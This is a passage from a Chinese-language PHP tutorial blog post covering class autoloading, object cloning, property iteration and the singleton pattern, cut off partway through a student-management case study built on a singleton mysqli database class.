title="类的自定义加载函数：spl_autoload_register()"></a>类的自定义加载函数：spl_autoload_register()</h3><p>PHP7以下版本，使用__autoload()实现类的自动加载；</p><p>PHP7以上版本，使用spl_autoload_register()实现类的自动加载。</p><p>当试图使用未定义的类时spl_autoload_register自动调用，使用一个类有以下几种情况：</p><p>使用new关键字创建不存在类的对象时，spl_autoload_register自动调用；例如：$obj = new Student()</p><p>当使用静态化方式访问一个不存在的类时，spl_autoload_register自动调用，例如：Student::show()；</p><p>当继承一个不存在的类时，spl_autoload_register自动调用，例如：class Stu extends Parent{}</p><p>当实现一个不存在的接口时，spl_autoload_register自动调用，例如：class Stu implements Inter</p><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><p>描述：将函数注册到SPL(标准PHP库)的__autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。</p><p>语法：    <code>bool spl_autoload_register ([ callback $autoload_function ] )</code></p><p>参数：$autoload_function，欲注册的自动装载函数，可以是匿名函数，也可以是字符串的函数名称。$autoload_function有一个传递过来的类名形参，用于在函数中构建类文件路径。</p><p>返回：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><h4 id="使用普通函数作为参数"><a href="#使用普通函数作为参数" class="headerlink" title="使用普通函数作为参数"></a>使用普通函数作为参数</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116101656750.png" alt="image-20201116101656750"></p><h4 id="使用匿名函数作为参数"><a href="#使用匿名函数作为参数" class="headerlink" title="使用匿名函数作为参数"></a>使用匿名函数作为参数</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116101840661.png" alt="image-20201116101840661"></p><h2 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h2><h3 id="什么是对象克隆？"><a href="#什么是对象克隆？" class="headerlink" title="什么是对象克隆？"></a>什么是对象克隆？</h3><p>如果已存在了一个对象，而还想再创建一个新对象，并且，两个对象的属性值不一样，或者属性比原来多 ，怎么实现呢？ $obj2 = $obj1 无法实现！</p><p>$obj2 = $obj1，这不是复制对象，而是将$obj1和$obj2指向了同一个对象地址。</p><p>创建新对象有两种方式：a. 使用new关键字； b. 使用 clone 关键字</p><h4 id="实例：对象克隆的演示"><a href="#实例：对象克隆的演示" class="headerlink" title="实例：对象克隆的演示"></a>实例：对象克隆的演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $name = <span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"><span class="comment">//克隆方法：当对象克隆完成时，自动调用的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">&quot;steady2&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age  = <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj1 = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="comment">//克隆对象：将$obj1克隆一份，传给$obj2</span></span><br><span class="line"><span class="comment">//克隆对象，是两个独立的新对象</span></span><br><span class="line">$obj2 = <span class="keyword">clone</span> $obj1;</span><br><span class="line">var_dump($obj1,$obj2);</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/phpinfo.php:<span class="number">20</span>:</span><br><span class="line"><span class="keyword">object</span>(Student)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;steady&#x27;</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;age&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">24</span></span><br><span class="line">/Applications/MAMP/htdocs/phpinfo.php:<span class="number">20</span>:</span><br><span class="line"><span class="keyword">object</span>(Student)[<span class="number">2</span>]</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;steady2&#x27;</span> (length=<span class="number">7</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;age&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">29</span></span><br></pre></td></tr></table></figure><h4 id="实例：魔术方法-clone-在克隆对象中的使用"><a href="#实例：魔术方法-clone-在克隆对象中的使用" class="headerlink" title="实例：魔术方法__clone()在克隆对象中的使用"></a>实例：魔术方法__clone()在克隆对象中的使用</h4><h3 id="对象遍历"><a href="#对象遍历" class="headerlink" title="对象遍历"></a>对象遍历</h3><p>foreach既可以遍历数组元素，也可以遍历对象属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"><span class="keyword">public</span>  $edu  = <span class="string">&quot;大专&quot;</span>;</span><br><span class="line"><span class="comment">//在类内遍历对象属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//在类外遍历对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;在类内遍历对象的属性&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">$this</span> <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$this-&gt;<span class="subst">&#123;$key&#125;</span> = <span class="subst">&#123;$value&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br><span class="line"><span class="comment">//在类外遍历对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;在类外遍历对象的属性&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($obj <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$obj-&gt;<span class="subst">&#123;$key&#125;</span> = <span class="subst">&#123;$value&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面向对象的设计模式"><a href="#面向对象的设计模式" class="headerlink" title="面向对象的设计模式"></a>面向对象的设计模式</h2><h3 id="什么是对象设计模式？"><a href="#什么是对象设计模式？" class="headerlink" title="什么是对象设计模式？"></a>什么是对象设计模式？</h3><p>设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。</p><h3 id="常用的设计模式有哪些？"><a href="#常用的设计模式有哪些？" class="headerlink" title="常用的设计模式有哪些？"></a>常用的设计模式有哪些？</h3><p>单例设计模式：一个类只能创建一个实例对象，不管用什么办法都无法创建第2个对象；</p><p>工厂设计模式：生产不同类对象的工厂；</p><p>策略设计模式：定义一组算法，将每个算法都封装起来，并且使它们之间可以互换。</p><p>观察者设计模式：定义对象间一种一对多的依赖关系，使得每当一个对象改变状态，则所有依赖于它的对象都会得到通知并被自动更新。</p><h3 id="单例设计模式的要求-三私一公"><a href="#单例设计模式的要求-三私一公" class="headerlink" title="单例设计模式的要求(三私一公)"></a>单例设计模式的要求(三私一公)</h3><p>一私：私有的静态的保存对象的属性。</p><p>一私：私有的构造方法，阻止类外new对象。</p><p>一私：私有的克隆方法，阻止类外clone对象。</p><p>一公：公共的静态的创建对象的方法。</p><h3 id="实例：单例设计模式演示"><a href="#实例：单例设计模式演示" class="headerlink" title="实例：单例设计模式演示"></a>实例：单例设计模式演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单例设计模式的核心代码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$db1 = Db::getInstance();</span><br><span class="line">$db2 = Db::getInstance();</span><br><span class="line">var_dump($db1,$db2);</span><br></pre></td></tr></table></figure><h1 id="综合案例：学生信息管理系统"><a href="#综合案例：学生信息管理系统" class="headerlink" title="综合案例：学生信息管理系统"></a>综合案例：学生信息管理系统</h1><h2 id="数据库工具类"><a href="#数据库工具类" class="headerlink" title="数据库工具类"></a>数据库工具类</h2><p>数据库工具类遵循单例模式，三私–私有对象、私有属性、私有构造方法和克隆方法，一公–公共方法用来生成对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的单例的数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link;   <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>($config);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的执行SQL语句的方法：insert、update、delete、set、drop等</span></span><br><span class="line"><span class="comment">//执行成功返回true，执行失败返回false</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//例如：update student set salary=salary+500 where id=5</span></span><br><span class="line"><span class="comment">//将SQL语句转成全小写</span></span><br><span class="line">$sql = strtolower($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是SELECT语句</span></span><br><span class="line"><span class="keyword">if</span>(substr($sql,<span class="number">0</span>,<span class="number">6</span>)==<span class="string">&#x27;select&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不能执行SELECT语句！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回执行的结果(布尔值)</span></span><br><span class="line"><span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;link, $sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的执行SQL语句的方法：select</span></span><br><span class="line"><span class="comment">//执行成功返回结果集对象，执行失败返回false</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//例如：SELECT * FROM student</span></span><br><span class="line"><span class="comment">//将SQL语句转成全小写</span></span><br><span class="line">$sql = strtolower($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是SELECT语句</span></span><br><span class="line"><span class="keyword">if</span>(substr($sql,<span class="number">0</span>,<span class="number">6</span>)!=<span class="string">&#x27;select&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不能执行非SELECT语句！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回执行的结果(结果集对象)</span></span><br><span class="line"><span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;link, $sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的获取单行数据的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchOne</span>(<span class="params">$sql,$type=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义返回数组类型的常量</span></span><br><span class="line">$types = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">1</span> =&gt; MYSQLI_NUM,</span><br><span class="line"><span class="number">2</span> =&gt; MYSQLI_BOTH,</span><br><span class="line"><span class="number">3</span> =&gt; MYSQLI_ASSOC,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一维数组</span></span><br><span class="line"><span class="keyword">return</span> mysqli_fetch_array($result, $types[$type]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的获取多行数据的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params">$sql, $type=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义返回数组类型的常量</span></span><br><span class="line">$types = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">1</span> =&gt; MYSQLI_NUM,</span><br><span class="line"><span class="number">2</span> =&gt; MYSQLI_BOTH,</span><br><span class="line"><span class="number">3</span> =&gt; MYSQLI_ASSOC,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回二维数组</span></span><br><span class="line"><span class="keyword">return</span> mysqli_fetch_all($result, $types[$type]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取记录数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rowCount</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line"><span class="comment">//返回记录数</span></span><br><span class="line"><span class="keyword">return</span> mysqli_num_rows($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的析构方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;link); <span class="comment">//断开MySQL连接</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库连接文件"><a href="#数据库连接文件" class="headerlink" title="数据库连接文件"></a>数据库连接文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//构建类文件的路径</span></span><br><span class="line">$filename = <span class="string">&quot;./libs/<span class="subst">$className</span>.class.php&quot;</span>;</span><br><span class="line"><span class="comment">//如果类文件存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))<span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span>=&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span>=&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span>=&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span>=&gt; <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span>=&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db = Db::getInstance($arr);</span><br></pre></td></tr></table></figure><h2 id="显示学生信息文件"><a href="#显示学生信息文件" class="headerlink" title="显示学生信息文件"></a>显示学生信息文件</h2><p>连接数据库，取出数据，通过前端输出数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 